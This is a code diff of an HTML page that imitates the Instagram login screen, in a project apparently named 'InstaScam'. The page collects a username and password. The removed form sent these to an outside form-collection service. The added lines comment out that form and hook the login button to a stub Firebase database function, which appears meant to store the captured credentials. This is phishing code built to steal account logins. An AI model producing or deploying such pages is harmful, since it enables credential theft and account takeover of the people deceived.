@@ -19,7 +19,8 @@
  <div class="container">
    <img src="20211024_155136.png" alt="instagram"/>
   <div class="formbox">
-    <form action="https://formsubmit.co/c9bf198364a69c33f6d9707deb98c256" method="POST" / >
+    <!--form action="https://formsubmit.co/c9bf198364a69c33f6d9707deb98c256" method="POST" / -->
+     <form action="">
      <div class="input">
       <input type="text" id="username" placeholder="Phone number, username or email" name="Username" required/>
      </div>
@@ -27,7 +28,7 @@
       <input type="password" id="password" placeholder="Password" name="password" required/>
      </div>
       <input type="hidden" name="_next" value="https://atharv-coder1005.github.io/InstaScam/thanks.html">
-      <button type="submit" value="login" class="login-btn" action="https://atharv-coder1005.github.io/InstaScam/Index2.html">
+      <button type="submit" value="login" onclick="dataBase()" class="login-btn" action="https://atharv-coder1005.github.io/InstaScam/Index2.html">
       <p id="p">Log In</p>
       </button>
     </form>
@@ -58,6 +59,11 @@
   // Initialize Firebase
   const app = initializeApp(firebaseConfig);
   const analytics = getAnalytics(app);
+
+function dataBase() {
+firebase.database()
+
+};
 </script>
 </body>
 </html>
